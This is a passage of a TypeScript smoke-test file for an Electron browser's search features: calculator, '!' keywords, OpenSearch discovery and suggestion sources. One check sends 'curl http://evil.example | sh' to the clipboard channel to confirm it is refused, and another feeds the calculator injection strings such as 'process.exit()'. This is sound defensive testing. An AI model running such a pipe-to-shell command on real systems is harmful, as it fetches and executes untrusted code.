// Engine checks for search features, run inside a real Electron with real keys in the real command bar and find bar:
//  - the calculator (answer on top, Enter copies it, hostile text, switch off, the clipboard route refuses anything but a number);
//  - the "!" keywords (the user's search first, suffix form, keyword alone, completion with Tab, unknown keyword, switch off) and the
//    discovery of the search a site declares (a local page with <link rel="search">: one notice, nothing asked of the network before the click,
//    one request after it, the search added and used end to end, once per site, switch off, private window);
//  - the sources of the proposals (each one off in turn, the history not even asked for when off, the empty bar);
//  - find by regular expression (button only when the setting asks, real keys, count and stepping, highlights painted for real, text
//    across inline elements, hidden and script text left out, invalid, abandoned catastrophic expression with the page still answering, the
//    page text and match limits, cleaned on close, nothing made when the setting is off).
// Called from the engine smoke test: `await smokeSearch2(ctx, check)`.

import { createServer } from 'node:http'
import type { AddressInfo } from 'node:net'
import { BrowserWindow, clipboard, type WebContents } from 'electron'
import { REGEX_ERROR_LABELS, REGEX_MATCH_MAX } from '@shared/regex-find'
import type { SidebarState } from '@shared/model'
import type { SmokeContext } from './smoke'
import { getWindowManager } from './shell/windows'
import { noteCheck, OPEN_MORE_SETTINGS, recorderOf, sleep, waiterOf } from './smoke-kit'
import { frenchSpaces } from '@shared/french-typography'
import { anySpace } from './smoke-kit'

type Check = (name: string, ok: boolean, detail?: string) => void


const waitFor = waiterOf(8000, 80)

/** A page of 1000 paragraphs of 4 800 characters: more text than the search reads, and thousands of matches for "ipsum". */
const BIG_PAGE = `<title>big</title><body>${Array.from({ length: 1000 }, () => `<p>${'lorem ipsum '.repeat(400)}</p>`).join('')}</body>`

export async function smokeSearch2(ctx: SmokeContext, check: Check): Promise<void> {
  const { browser, store, win, overlayView } = ctx
  const ui = overlayView.webContents
  const state = (): SidebarState => store.get()
  const patch = (settings: Partial<SidebarState['settings']>) => browser.dispatch({ type: 'settings/update', patch: settings })
  const saved = { ...state().settings }
  const mine: string[] = []

  // ---- a local site: pages for each feature, and a counter of what is asked of it ----
  const hits = new Map<string, number>()
  let base = ''
  const server = createServer((req, res) => {
    const url = new URL(req.url ?? '/', 'http://x')
    hits.set(url.pathname, (hits.get(url.pathname) ?? 0) + 1)
    res.setHeader('cache-control', 'no-store')
    const html = (body: string) => {
      res.setHeader('content-type', 'text/html; charset=utf-8')
      res.end(body)
    }
    switch (url.pathname) {
      case '/find':
        return html(`<title>find page</title><body>
          <p>Planète 2024 et planète 1999. Prix : 12,50 € puis 7,25 €.</p>
          <p>Hello <b>wor</b>ld across inline elements</p>
          <p style="display:none">hidden 5555</p>
          <script>var scriptText = "script 7777"</script>
          <style>.x::after { content: "style 8888" }</style></body>`)
      case '/slow':
        return html(`<title>slow page</title><body><p>${'a'.repeat(60)}c</p></body>`)
      case '/big':
        return html(BIG_PAGE)
      case '/search-site':
        return html(`<title>search site</title><link rel="search" type="application/opensearchdescription+xml" title="Smoke Search" href="/opensearch.xml"><body>declares a search</body>`)
      case '/search-elsewhere':
        // Declares a file on another host (localhost is not 127.0.0.1): not the site's own, so nothing is offered.
        return html(`<title>search elsewhere</title><link rel="search" type="application/opensearchdescription+xml" title="Elsewhere" href="${base.replace('127.0.0.1', 'localhost')}/opensearch.xml"><body>declares a search elsewhere</body>`)
      case '/search-site-bg':
        return html(`<title>search bg</title><link rel="search" type="application/opensearchdescription+xml" title="Smoke Search" href="/opensearch.xml"><body>declares a search, in a tab nobody looks at</body>`)
      case '/no-search':
        return html('<title>no search</title><body>nothing declared</body>')
      case '/opensearch.xml':
        res.setHeader('content-type', 'application/opensearchdescription+xml')
        return void res.end(`<?xml version="1.0"?><OpenSearchDescription xmlns="http://a9.com/-/spec/opensearch/1.1/"><ShortName>Smoke OS</ShortName><Url type="text/html" method="get" template="${base}/q?term={searchTerms}"/></OpenSearchDescription>`)
      case '/q':
        return html(`<title>q ${url.searchParams.get('term') ?? ''}</title><body>search result</body>`)
      default:
        return html(`<title>${decodeURIComponent(url.pathname.slice(1).replace(/^s\//, '').replace(/-/g, ' '))}</title><body>page</body>`)
    }
  })
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`
  const hitsOf = (path: string) => hits.get(path) ?? 0

  const open = async (path: string, title: string): Promise<string> => {
    browser.dispatch({ type: 'tab/open', url: `${base}${path}` })
    const id = state().tabs.at(-1)!.id
    mine.push(id)
    await waitFor(() => state().tabs.find((t) => t.id === id)?.title === title && browser.snapshot().runtime.tabs[id]?.loading === false)
    return id
  }
  const wcOf = (id: string) => (browser.pageFor(id) as unknown as { webContents: WebContents } | undefined)?.webContents
  const toast = () => browser.snapshot().toast

  // ---- real keys in the overlay (the command bar, the find bar) ----
  const key = async (keyCode: string, modifiers: Array<'shift'> = [], times = 1) => {
    for (let i = 0; i < times; i++) {
      ui.sendInputEvent({ type: 'keyDown', keyCode, modifiers })
      ui.sendInputEvent({ type: 'keyUp', keyCode, modifiers })
      await sleep(50)
    }
  }
  const typeText = async (text: string) => {
    for (const ch of text) {
      // A key code exists for letters, digits and the space; the other characters (\ { } ( ) * + | ! ,) reach the field as typed text.
      if (/^[a-z0-9]$/i.test(ch) || ch === ' ') {
        const keyCode = ch === ' ' ? 'Space' : ch
        ui.sendInputEvent({ type: 'keyDown', keyCode })
        ui.sendInputEvent({ type: 'char', keyCode: ch })
        ui.sendInputEvent({ type: 'keyUp', keyCode })
      } else ui.sendInputEvent({ type: 'char', keyCode: ch })
      await sleep(30)
    }
    await sleep(350)
  }
  const click = async (wc: WebContents, x: number, y: number) => {
    for (const type of ['mouseMove', 'mouseDown', 'mouseUp'] as const) wc.sendInputEvent({ type, x: Math.round(x), y: Math.round(y), button: 'left', clickCount: 1 })
    await sleep(120)
  }
  const evaluate = <T>(wc: WebContents, js: string) => wc.executeJavaScript(js) as Promise<T>
  const focused = async (selector: string) => (await evaluate<boolean>(ui, `document.activeElement === document.querySelector(${JSON.stringify(selector)})`)) === true
  /**
   * Opens the bar and puts `text` in it: typed key by key (the way a person does, so that "yt " or "!w " turns into the pill of the site as soon
   * as the space is typed), or, with `whole`, as the text the bar opens with (as if pasted: no pill, the rows are the ranking of the whole text).
   */
  const openBar = async (text: string, whole = false) => {
    // A request sent while the overlay page is still starting is lost: ask again until the field has the focus, then type.
    for (let attempt = 0; attempt < 4; attempt++) {
      browser.openOverlay({ panel: 'commandbar', mode: 'new', initial: whole ? text : '' })
      if (await waitFor(() => focused('.palette-input'), 3000)) break
    }
    await sleep(200)
    if (whole) await sleep(350)
    else await typeText(text)
  }
  interface Row {
    label: string
    detail: string
    hint: string
    selected: boolean
    search: boolean
  }
  const rows = () =>
    evaluate<Row[]>(
      ui,
      `[...document.querySelectorAll('.results li[role="option"]')].map((li) => ({ label: li.querySelector('.label')?.textContent ?? '', detail: li.querySelector('.detail')?.textContent ?? '', hint: li.querySelector('.hint')?.textContent ?? '', selected: li.classList.contains('selected'), search: !!li.querySelector('.result-icon path[d^="M9 15.5"]') }))`
    )
  const labels = async () => (await rows()).map((r) => r.label)
  const pill = () => evaluate<string>(ui, `document.querySelector('.scope-pill')?.firstChild?.textContent?.trim() ?? ''`)

  const suggestionsBefore = state().settings.searchSuggestions
  // What is typed stays between the user and the bar: no request to the search engine for these words.
  patch({ searchSuggestions: false })
  const sentinel = 'search2-sentinel'
  const archiveBefore = state().archive.length
  const readClip = async () => String(await clipboard.readText())

  try {
    // ===================================================== the calculator =====================================================
    // The tab on screen is never offered by the bar: this one is the "current" page, and the pages of the checks below are the others.
    await open('/s/anchor', 'anchor')
    await clipboard.writeText(sentinel)
    await openBar('12*(3+4)')
    let list = await rows()
    check('calc: "12*(3+4)" gives "= 84" at the top of the list, with the expression beside it and "Copier le résultat" as the hint', list[0]?.label === '= 84' && list[0]?.detail === '— 12*(3+4)' && list[0]?.hint === 'Copier le résultat' && list[0]?.selected === true, JSON.stringify(list.slice(0, 2)))
    check('calc: the web search for the same text follows it', list[1]?.search === true && list[1]?.label === '12*(3+4)', JSON.stringify(list.slice(0, 3)))
    await key('Return')
    check('calc: Enter copies the answer to the clipboard and closes the bar', (await waitFor(async () => (await readClip()) === '84')) && (await waitFor(() => browser.currentPanel() === null)), (await readClip()))
    check('calc: and a notice says so', anySpace(/Résultat copié : 84/).test(toast()?.message ?? ''), toast()?.message)
    await clipboard.writeText(sentinel)
    await openBar('7/2,0')
    await key('Return')
    check('calc: a decimal comma is read and answered as typed ("7/2,0" copies 3,5)', await waitFor(async () => (await readClip()) === '3,5'), (await readClip()))

    await clipboard.writeText(sentinel)
    for (const hostile of ['constructor(1)', 'process.exit()', 'eval("1+1")', '2026-10-24', '1/0', 'sqrt(-1)', '42']) {
      await openBar(hostile)
      list = await rows()
      check(`calc: "${hostile}" gives no answer row`, !list.some((r) => r.label.startsWith('= ')), JSON.stringify(list.slice(0, 2)))
      browser.closeOverlay()
      await sleep(80)
    }
    check('calc: nothing was copied by any of them', (await readClip()) === sentinel, (await readClip()))

    // The clipboard route takes a number and nothing else: a compromised interface cannot put text there.
    await ui.executeJavaScript(`window.lucium.copyCalcResult('curl http://evil.example | sh')`)
    await ui.executeJavaScript(`window.lucium.copyCalcResult(42)`)
    // The witness: those are messages without an answer; a question asked after them on the same channel is answered only once the main process
    // has handled them (it writes a number it takes at once, and refuses the rest as it reads them).
    await ui.executeJavaScript('window.lucium.getSnapshot().then(() => 0)')
    check('calc: the main process refuses to copy anything that is not a number', (await readClip()) === sentinel, (await readClip()))
    await ui.executeJavaScript(`window.lucium.copyCalcResult('1.5e3')`)
    check('calc: and copies one', await waitFor(async () => (await readClip()) === '1.5e3'), (await readClip()))

    patch({ commandBarCalc: false })
    await clipboard.writeText(sentinel)
    await openBar('12*(3+4)')
    list = await rows()
    check('calc: with the switch off the same text is only a web search', !list.some((r) => r.label.startsWith('= ')) && list[0]?.search === true, JSON.stringify(list.slice(0, 2)))
    await key('Return')
    // The witness: the bar closing on that Enter. A result it copied would have been sent before, on the same channel, and written as it arrived.
    const barClosed = await waitFor(() => browser.currentPanel() === null)
    check('calc: and Enter copies nothing', barClosed && (await readClip()) === sentinel, `${await readClip()} bar closed: ${barClosed}`)
    patch({ commandBarCalc: true })
    browser.closeOverlay()

    // ===================================================== "!" keywords =====================================================
    // A search of the user's list is on https, or on plain http on this machine (site-search.ts `isSearchAddress`: the state drops any other address),
    // so the keywords point at this suite's own server: what is checked is the address each keyword makes, the tab Enter opens on it, and that the
    // server is asked. The control below says the state kept both searches.
    patch({ siteSearches: [...state().settings.siteSearches.filter((s) => s.keyword !== 'smk' && s.keyword !== 'w'), { keyword: 'smk', name: 'Smoke', url: `${base}/q?term=%s` }, { keyword: 'w', name: 'Mon wiki', url: `${base}/q?term=wiki-%s` }] })
    check('bangs: (control) the two searches of the user are in the list', ['smk', 'w'].every((k) => state().settings.siteSearches.some((s) => s.keyword === k && s.url.startsWith(base))), JSON.stringify(state().settings.siteSearches.filter((s) => s.url.startsWith(base))))
    // Typed, "!smk " becomes the pill of the site as soon as the space is typed (as "yt " does), and the rest is searched in that site.
    await openBar('!smk hello')
    list = await rows()
    check('bangs: typing "!smk " makes the pill of the site, and the row is the search of "hello" in it', (await pill()) === 'Smoke' && list[0]?.label === 'hello' && list[0]?.detail === '— Smoke' && list[0]?.search === true, `${await pill()} ${JSON.stringify(list.slice(0, 2))}`)
    const tabsBefore = state().tabs.length
    await key('Return')
    // The tab is in the state as soon as it is opened; the server is asked a moment later, and a slow machine (a GitHub runner) is asked later still: wait for the request too.
    check('bangs: Enter opens it in a new tab', (await waitFor(() => state().tabs.length === tabsBefore + 1 && state().tabs.at(-1)?.url === `${base}/q?term=hello`)) && (await waitFor(() => hitsOf('/q') >= 1)), `${state().tabs.at(-1)?.url} hits ${hitsOf('/q')}`)
    mine.push(state().tabs.at(-1)!.id)
    // The whole text at once (a paste, or a bar opened with a text): no pill, and the search of the site takes the place of the web search.
    await openBar('!smk hello', true)
    list = await rows()
    check('bangs: "!smk hello" as a whole leads with the search of that site, in the place of the web search', (await pill()) === '' && list[0]?.label === frenchSpaces('Smoke : « hello »') && list[0]?.detail === '— Recherche sur le site' && !list.some((r) => r.search), JSON.stringify(list.slice(0, 3)))
    browser.closeOverlay()

    await openBar('à la !smk')
    check('bangs: the keyword may come last ("à la !smk")', (await rows())[0]?.label === frenchSpaces('Smoke : « à la »'))
    await key('Return')
    check('bangs: and opens the same way', await waitFor(() => state().tabs.at(-1)?.url === `${base}/q?term=%C3%A0%20la`), state().tabs.at(-1)?.url)
    mine.push(state().tabs.at(-1)!.id)

    await openBar('!w planète', true)
    check('bangs: the searches of the user come before the fixed list ("!w" is theirs here)', (await rows())[0]?.label === frenchSpaces('Mon wiki : « planète »'), JSON.stringify((await rows()).slice(0, 2)))
    await openBar('!w planète')
    check('bangs: and typed, the pill is theirs too', (await pill()) === 'Mon wiki' && (await rows())[0]?.label === 'planète', `${await pill()} ${JSON.stringify((await rows()).slice(0, 1))}`)
    browser.closeOverlay()
    patch({ siteSearches: state().settings.siteSearches.filter((s) => s.keyword !== 'w') })
    await openBar('!wen planète', true)
    list = await rows()
    check('bangs: a keyword of the fixed list works without being in the settings ("!wen" is Wikipedia in English)', list[0]?.label === frenchSpaces('Wikipedia (anglais) : « planète »'), JSON.stringify(list.slice(0, 2)))
    await openBar('!wen planète')
    check('bangs: and typed, it is a pill too', (await pill()) === 'Wikipedia (anglais)' && (await rows())[0]?.label === 'planète', `${await pill()} ${JSON.stringify((await rows()).slice(0, 1))}`)
    browser.closeOverlay()

    await openBar('!smk')
    list = await rows()
    check('bangs: the keyword alone offers to open the site, and to complete with Tab', list[0]?.label === 'Smoke' && list[0]?.detail === '— Ouvrir le site' && list.some((r) => r.label === 'Rechercher sur Smoke' && r.detail === '— Tab ⇥'), JSON.stringify(list.slice(0, 3)))
    await key('Return')
    check('bangs: Enter opens the site itself', await waitFor(() => state().tabs.at(-1)?.url === `${base}/`), state().tabs.at(-1)?.url)
    mine.push(state().tabs.at(-1)!.id)

    await openBar('!sm')
    await key('Tab')
    check('bangs: Tab on "!sm" turns it into the pill of the site', await waitFor(async () => (await pill()) === 'Smoke'), await pill())
    await typeText('zzz')
    await key('Return')
    check('bangs: and what is typed next is searched in that site', await waitFor(() => state().tabs.at(-1)?.url === `${base}/q?term=zzz`), state().tabs.at(-1)?.url)
    mine.push(state().tabs.at(-1)!.id)

    await openBar('!')
    list = await rows()
    check('bangs: "!" alone lists keywords to complete with Tab', list.filter((r) => r.detail === '— Tab ⇥').length >= 3, JSON.stringify(list.map((r) => `${r.label} ${r.detail}`)))
    browser.closeOverlay()

    await openBar('!nope hello')
    list = await rows()
    check('bangs: an unknown keyword is plain text for the search engine', list[0]?.search === true && list[0]?.label === '!nope hello', JSON.stringify(list.slice(0, 2)))
    browser.closeOverlay()

    await openBar('smk hello')
    list = await rows()
    check('bangs: the older form "smk hello" works as before: typed, it is the pill of the site', (await pill()) === 'Smoke' && list[0]?.label === 'hello' && list[0]?.detail === '— Smoke', `${await pill()} ${JSON.stringify(list.slice(0, 2))}`)
    await openBar('smk hello', true)
    list = await rows()
    check('bangs: …and as a whole text it is the search of the site', list[0]?.label === frenchSpaces('Smoke : « hello »') && list[0]?.detail === '— Recherche sur le site', JSON.stringify(list.slice(0, 2)))
    browser.closeOverlay()

    patch({ searchBangs: false })
    await openBar('!smk hello')
    list = await rows()
    check('bangs: with the switch off "!smk hello" is only a web search', list[0]?.search === true && list[0]?.label === '!smk hello' && !list.some((r) => r.label.startsWith('Smoke')), JSON.stringify(list.slice(0, 2)))
    browser.closeOverlay()
    patch({ searchBangs: true })

    // ============================================== what a site declares about its search ==============================================
    // The searches of the bangs above point at this very site: the user would have one already, and nothing would be offered (nor refused by the private window's guard alone).
    patch({ siteSearches: saved.siteSearches })
    // The pages share their prototype: any page that exists gives it (the tab on screen has one; a tab left behind, like the anchor, may have been put to sleep).
    const probePage = state().tabs.map((t) => browser.pageFor(t.id)).find((page) => page !== undefined) as unknown as object
    const proto = Object.getPrototypeOf(probePage) as { declaredSearches: (...args: unknown[]) => Promise<unknown> }
    const realDeclared = proto.declaredSearches
    // Every page read is recorded by its address, for the detail of a failure. With the setting off nothing at all may be read. With it on, a page of the network
    // (a search result opened by a fallback, a leftover tab) or of another check that wakes up and loads again while it is shown is read too, and says nothing
    // about the local pages: the checks count the pages of this suite's own server (`ownReads`), and the page meant by its path (`callsOf`).
    const readAddresses: string[] = []
    // The reads that have ended, by address: the shell decides what to offer as soon as it has what a page declares (search-discovery.ts), so the end
    // of a read is the witness of a check that nothing is offered.
    const endedAddresses: string[] = []
    proto.declaredSearches = function (this: unknown, ...args: unknown[]) {
      const address = (this as { webContents?: WebContents }).webContents?.getURL() ?? ''
      readAddresses.push(address)
      const reading = realDeclared.apply(this, args)
      const ended = (): void => void endedAddresses.push(address)
      void reading.then(ended, ended)
      return reading
    }
    const readEnded = (path: string) => endedAddresses.some((u) => URL.canParse(u) && new URL(u).origin === base && new URL(u).pathname === path)
    const ownPages = () => readAddresses.filter((u) => URL.canParse(u) && new URL(u).origin === base)
    const ownReads = () => ownPages().length
    const callsOf = (path: string) => ownPages().filter((u) => new URL(u).pathname === path).length
    // A host is read once per session (`SearchDiscovery.checked`): a local page read by an earlier check of this run would hide the pages of the checks below.
    const forgetCheckedHosts = () => (browser as unknown as { searchDiscovery?: { checked?: Set<string> } }).searchDiscovery?.checked?.clear()
    try {
      // off by default: the page is not even read
      check('discovery: the setting is off by default', saved.searchDiscovery === false)
      patch({ searchDiscovery: false, searchDiscoverySeen: [] })
      // No wait after it: the shell decides whether to read a page as it hears the end of its load (browser-pages.ts, `discoverSearch`), which `open`
      // waits for, and a read is counted as it starts.
      await open('/search-site', 'search site')
      check('discovery: with the setting off the page is not read, nothing is offered, nothing is asked of the site', readAddresses.length === 0 && !/Ajouter la recherche/.test(toast()?.message ?? '') && hitsOf('/opensearch.xml') === 0 && state().settings.searchDiscoverySeen.length === 0, JSON.stringify({ read: readAddresses, hits: hitsOf('/opensearch.xml') }))
      // The tab the check of a page loaded behind goes back to: on another host name of the server (localhost), opened while the setting is off. The sites
      // are looked at once per session (search-discovery.ts): if this tab was put to sleep and loads again when it is shown, it is read, and that must not
      // use up the one look at 127.0.0.1 that the checks below count on.
      browser.dispatch({ type: 'tab/open', url: `${base.replace('127.0.0.1', 'localhost')}/s/aside` })
      const aside = state().tabs.at(-1)!.id
      mine.push(aside)
      await waitFor(() => state().tabs.find((t) => t.id === aside)?.title === 'aside' && browser.snapshot().runtime.tabs[aside]?.loading === false)

      // a private window never offers (it has no list of its own to add to)
      patch({ searchDiscovery: true })
      const manager = getWindowManager()
      const priv = manager.openPrivate()
      priv.browser.dispatch({ type: 'tab/open', url: `${base}/search-site` })
      // The witness: the end of the load of the private tab, where its window decides whether to read the page (a read is counted as it starts).
      await waitFor(() => priv.store.get().tabs.some((t) => t.url === `${base}/search-site` && t.title === 'search site' && priv.browser.snapshot().runtime.tabs[t.id]?.loading === false))
      check('discovery: a private window does not read the page nor offer anything', readAddresses.length === 0 && !/Ajouter la recherche/.test(priv.browser.snapshot().toast?.message ?? '') && priv.store.get().settings.searchDiscoverySeen.length === 0, JSON.stringify({ read: readAddresses, toast: priv.browser.snapshot().toast?.message }))
      priv.win.close()
      await waitFor(() => manager.privateWindows().length === 0)
      await manager.settled()
      win.emit('focus')

      // a page that finishes loading in a tab that is not on screen is not looked at: the notice would be about a page nobody is looking at
      patch({ searchDiscovery: true, searchDiscoverySeen: [] })
      forgetCheckedHosts()
      const callsBefore = ownReads()
      browser.dispatch({ type: 'tab/open', url: `${base}/search-site-bg` })
      const hidden = state().tabs.at(-1)!.id
      mine.push(hidden)
      browser.dispatch({ type: 'tab/select', id: aside })
      // The witness is the end of the load: the shell decides there whether to read the page, and a read is counted as it starts.
      const loadedAside = await waitFor(() => hitsOf('/search-site-bg') >= 1 && browser.snapshot().runtime.tabs[hidden]?.loading === false, 8000)
      check('discovery: a page that finishes loading in a tab that is not on screen is not looked at', loadedAside && callsOf('/search-site-bg') === 0 && ownReads() === callsBefore && !/Ajouter la recherche/.test(toast()?.message ?? '') && state().settings.searchDiscoverySeen.length === 0, JSON.stringify({ loadedAside, callsBefore, seen: state().settings.searchDiscoverySeen, toast: toast()?.message, read: readAddresses }))

      // on: one notice, no request to the site before the click
      patch({ searchDiscovery: true, searchDiscoverySeen: [] })
      forgetCheckedHosts()
      const readsBefore = ownReads()
      const siteTab = await open('/search-site', 'search site')
      check('discovery: with the setting on, a page that declares a search is offered it', await waitFor(() => anySpace(/Ajouter la recherche dans « Smoke Search » \?/).test(toast()?.message ?? ''), 6000), toast()?.message)
      const offered = toast()
      check('discovery: the notice has one button, "Ajouter"', offered?.action === 'Ajouter', JSON.stringify(offered))
      check('discovery: the site is recorded as offered, and nothing was asked of it (not even the description file)', state().settings.searchDiscoverySeen.includes('127.0.0.1') && hitsOf('/opensearch.xml') === 0 && callsOf('/search-site') === 1 && ownReads() - readsBefore === 1, JSON.stringify({ seen: state().settings.searchDiscoverySeen, hits: hitsOf('/opensearch.xml'), readsBefore, read: readAddresses }))
      check('discovery: nothing is added without the click', !state().settings.siteSearches.some((s) => s.url.startsWith(`${base}/q?term=%s`)))

      // once per site
      const offeredId = offered?.id ?? 0
      browser.dispatch({ type: 'tab/open', url: `${base}/search-site?again` })
      const again = state().tabs.at(-1)!.id
      mine.push(again)
      // The witness: the end of the load, where the shell decides whether to read the page (a read is counted as it starts).
      await waitFor(() => state().tabs.find((t) => t.id === again)?.title === 'search site' && browser.snapshot().runtime.tabs[again]?.loading === false)
      check('discovery: the same site is not offered again, and not read again', callsOf('/search-site') === 1 && ownReads() - readsBefore === 1 && (toast()?.id ?? 0) === offeredId, JSON.stringify({ readsBefore, toast: toast(), read: readAddresses }))

      // the click
      await win.webContents.executeJavaScript(`window.lucium.toastAction(${offeredId})`)
      check('discovery: the click reads the description file, once', await waitFor(() => hitsOf('/opensearch.xml') === 1), String(hitsOf('/opensearch.xml')))
      const added = await waitFor(() => state().settings.siteSearches.some((s) => s.name === 'Smoke OS'))
      const site = state().settings.siteSearches.find((s) => s.name === 'Smoke OS')
      check('discovery: and the search is added, with the address of the file and a keyword of its own', added && site?.url === `${base}/q?term=%s` && site.keyword === 'site', JSON.stringify(site))
      check('discovery: a notice says how to use it', anySpace(/Recherche ajoutée : tapez « site » puis Tab/).test(toast()?.message ?? ''), toast()?.message)

      // end to end with the new search, by "!" and by the older form
      await openBar('!site yeah', true)
      list = await rows()
      check('discovery: the new search answers to "!site"', list[0]?.label === frenchSpaces('Smoke OS : « yeah »'), JSON.stringify(list.slice(0, 2)))
      await openBar('!site yeah')
      check('discovery: typed, "!site " is its pill', (await pill()) === 'Smoke OS' && (await rows())[0]?.label === 'yeah', `${await pill()} ${JSON.stringify((await rows()).slice(0, 1))}`)
      await key('Return')
      check('discovery: and the page it opens is the site’s own search', await waitFor(() => state().tabs.at(-1)?.url === `${base}/q?term=yeah`), state().tabs.at(-1)?.url)
      mine.push(state().tabs.at(-1)!.id)
      browser.dispatch({ type: 'tab/close', id: siteTab })

      // a file declared on another host is not the site's own: nothing is offered, nothing is asked
      const before = hitsOf('/opensearch.xml')
      patch({ searchDiscoverySeen: [] })
      forgetCheckedHosts()
      const readsElsewhere = ownReads()
      await open('/search-elsewhere', 'search elsewhere')
      // The witness: the end of the read of the page, after which the shell decides at once what to offer.
      await waitFor(() => readEnded('/search-elsewhere'))
      // The page is read (the link is there): it is what the link points to that is refused.
      check('discovery: a link whose file is on another host is not offered, and the file is not asked for', callsOf('/search-elsewhere') === 1 && ownReads() - readsElsewhere === 1 && !/Ajouter la recherche/.test(toast()?.message ?? '') && hitsOf('/opensearch.xml') === before && state().settings.searchDiscoverySeen.length === 0, JSON.stringify({ toast: toast()?.message, reads: ownReads() - readsElsewhere, read: readAddresses }))

      // a page that declares nothing is read once and offers nothing
      forgetCheckedHosts()
      const readsNothing = ownReads()
      await open('/no-search', 'no search')
      // The witness: the end of the read of the page, after which the shell decides at once what to offer.
      await waitFor(() => readEnded('/no-search'))
      check('discovery: a page that declares nothing offers nothing and is not recorded', callsOf('/no-search') === 1 && ownReads() - readsNothing === 1 && !/Ajouter la recherche/.test(toast()?.message ?? '') && state().settings.searchDiscoverySeen.length === 0, JSON.stringify({ toast: toast()?.message, reads: ownReads() - readsNothing, read: readAddresses }))
    } finally {
      proto.declaredSearches = realDeclared
      patch({ searchDiscovery: false })
      patch({ siteSearches: state().settings.siteSearches.filter((s) => s.name !== 'Smoke OS') })
    }

    // ===================================================== the sources of the proposals =====================================================
    await open('/s/zzsrc-open', 'zzsrc open')
    const historyTab = await open('/s/zzsrc-history', 'zzsrc history')
    browser.dispatch({ type: 'tab/close', id: historyTab })
    browser.dispatch({ type: 'archive/add', url: `${base}/s/zzsrc-archived`, title: 'zzsrc archived', source: 'manual' })
    const laterTab = await open('/s/zzsrc-later', 'zzsrc later')
    browser.dispatch({ type: 'readlater/add', tabId: laterTab })
    await open('/s/zzsrc-current', 'zzsrc current')
    // A row is told by its label and by what its detail says it is (a closed tab also lands in the archive: the label alone would not tell).
    const SOURCES: ReadonlyArray<readonly [keyof SidebarState['settings'], string, (r: Row) => boolean]> = [
      ['suggestTabs', 'zzsrc open', (r) => r.label === 'zzsrc open' && !r.detail.includes('·')],
      ['suggestHistory', 'zzsrc history', (r) => r.label === 'zzsrc history' && r.detail.startsWith('— Historique')],
      ['suggestArchive', 'zzsrc archived', (r) => r.label === 'zzsrc archived' && r.detail.startsWith('— Archivé')],
      ['suggestReadLater', 'zzsrc later', (r) => r.label === 'zzsrc later' && r.detail.startsWith('— Lire plus tard')]
    ]
    // the pages of the history are asked of the main process, which this counts
    const realHistory = browser.searchHistory.bind(browser)
    let historyAsks = 0
    browser.searchHistory = ((query: string, limit?: number) => {
      historyAsks++
      return realHistory(query, limit)
    }) as typeof browser.searchHistory
    try {
      await waitFor(() => browser.searchHistory('zzsrc history').some((h) => h.title === 'zzsrc history'))
      await openBar('zzsrc')
      let list2 = await rows()
      check('sources: by default all four sources answer (tab, history, archive, read later)', SOURCES.every(([, , is]) => list2.some(is)), JSON.stringify(list2.map((r) => `${r.label}${r.detail}`)))
      browser.closeOverlay()
      for (const [setting, label, is] of SOURCES) {
        patch({ [setting]: false })
        await openBar('zzsrc')
        list2 = await rows()
        check(`sources: ${setting} off leaves out "${label}" and only that one`, !list2.some(is) && SOURCES.filter(([, other]) => other !== label).every(([, , other]) => list2.some(other)), JSON.stringify(list2.map((r) => `${r.label}${r.detail}`)))
        browser.closeOverlay()
        patch({ [setting]: true })
      }
      patch({ suggestHistory: false })
      historyAsks = 0
      await openBar('zzsrc')
      check('sources: with the history off the bar does not even ask for it', historyAsks === 0, String(historyAsks))
      browser.closeOverlay()
      patch({ suggestHistory: true })
      historyAsks = 0
      await openBar('zzsrc')
      check('sources: and asks for it again once it is on', historyAsks > 0, String(historyAsks))
      browser.closeOverlay()

      await openBar('')
      let names = await labels()
      check('sources: the empty bar lists the open tabs by default', names.includes('zzsrc open'), JSON.stringify(names))
      browser.closeOverlay()
      patch({ suggestTabs: false })
      await openBar('')
      names = await labels()
      check('sources: and no tab, only the commands, when tabs are off', !names.some((n) => n.startsWith('zzsrc')) && names.length > 0, JSON.stringify(names))
      browser.closeOverlay()
      patch({ suggestTabs: true })
    } finally {
      browser.searchHistory = realHistory as typeof browser.searchHistory
      if (archiveBefore === 0) browser.dispatch({ type: 'archive/clear' })
      for (const item of state().readLater.filter((i) => i.title === 'zzsrc later')) browser.dispatch({ type: 'readlater/remove', id: item.id })
    }

    // ===================================================== the Settings window =====================================================
    // The search settings are rows of Réglages › Navigation (SettingsCategories.tsx: SearchSettings, then CommandBarSettings), each one a switch;
    // they were in the box « Réglages de la recherche… » of the Profiles pane, which no longer exists. « Plus de réglages » is opened: every row is shown
    // (the calculator waits there, and a switch of the closed fold has no box on screen: a click aimed at it lands on nothing).
    // The search by regular expression is a line of « Fonctions en option » since 1.1.0 (settings-catalog.ts, FEATURE_THEMES), no longer a row of this page.
    browser.openOverlay({ panel: 'settings', pane: 'navigation' })
    const settingsWindow = async (): Promise<BrowserWindow | undefined> => {
      await waitFor(() => BrowserWindow.getAllWindows().some((w) => w.getTitle() === 'Réglages'), 6000)
      return BrowserWindow.getAllWindows().find((w) => w.getTitle() === 'Réglages')
    }
    const sw = await settingsWindow()
    const swc = sw?.webContents
    if (swc) {
      await waitFor(() => evaluate<boolean>(swc, OPEN_MORE_SETTINGS), 6000)
      const wanted = ['Pages de l’historique', 'Onglets ouverts', 'Onglets archivés', 'Pages à lire plus tard', 'Inclure les suggestions de recherche', frenchSpaces('Mots-clés avec « ! » (!w planète)'), 'Calculatrice (12*(3+4))', 'Proposer d’ajouter la recherche d’un site']
      const switches = () => evaluate<string[]>(swc, `[...document.querySelectorAll('.settings-content input[role="switch"]')].map((e) => e.getAttribute('aria-label') ?? '')`)
      await waitFor(async () => {
        const now = await switches()
        return wanted.every((w) => now.includes(w))
      }, 6000)
      const texts = await switches()
      check('settings: Réglages › Navigation has the switches of the sources, the search suggestions, the "!" keywords, the calculator and the discovery', wanted.every((w) => texts.includes(w)), JSON.stringify(texts))
      const calcSwitch = await evaluate<{ x: number; y: number; width: number; height: number } | null>(
        swc,
        `(() => { const el = document.querySelector('.settings-content input[role="switch"][aria-label="Calculatrice (12*(3+4))"]'); if (!el) return null; el.scrollIntoView({ block: 'center' }); const r = el.getBoundingClientRect(); return { x: r.x, y: r.y, width: r.width, height: r.height } })()`
      )
      if (calcSwitch) {
        const before = state().settings.commandBarCalc
        await click(swc, calcSwitch.x + calcSwitch.width / 2, calcSwitch.y + calcSwitch.height / 2)
